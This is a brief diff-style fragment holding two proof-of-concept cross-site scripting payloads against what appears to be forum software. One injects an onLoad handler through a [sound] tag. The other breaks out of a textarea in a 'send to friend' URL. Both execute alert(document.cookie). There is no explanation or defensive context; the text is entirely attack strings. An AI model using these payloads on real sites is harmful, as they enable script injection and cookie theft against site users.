@@ -1,0 +1,6 @@
+[sound]http://www.example.com"
+onLoad="alert(document.cookie)[/sound]
+
+http://www.example.com/forum/pop_send_to_friend.asp?url=</textarea><img
+src="http://www.google.it/intl/it_it/images/logo.gif" onLoad
+="alert(document.cookie)">
